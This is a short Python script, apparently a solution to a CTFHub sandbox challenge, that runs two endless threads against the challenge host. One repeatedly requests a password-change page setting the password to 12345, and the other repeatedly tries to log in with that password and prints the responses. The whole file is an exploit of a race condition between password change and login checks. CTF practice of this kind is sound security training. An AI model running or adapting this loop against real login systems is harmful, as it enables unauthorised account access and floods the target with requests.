#两个线程竞争

import requests
import threading

s = requests.session()


class MyThread(threading.Thread):
    def __init__(self, item):
        threading.Thread.__init__(self)
        self.item = item

    def run(self):
        main(self.item)


def main(args):
    if args == 1:
        while True:
            ur11 = 'http://challenge-69c88acc7635a740.sandbox.ctfhub.com:10080/change_passwd.php?passwd=12345&passwd_confirm=12345'
            c = s.get(ur11).content
    else:
        while True:
            url2 = 'http://challenge-69c88acc7635a740.sandbox.ctfhub.com:10080/login_check.php?passwd=12345'
            # c11 = s.get(url2, data={' passwd': 111}).content
            c1 = s.get(url2)
            print(c1.text)


if __name__ == '__main__':
    t1 = MyThread(1)
    t2 = MyThread(2)
    t1.start()
    t2.start()

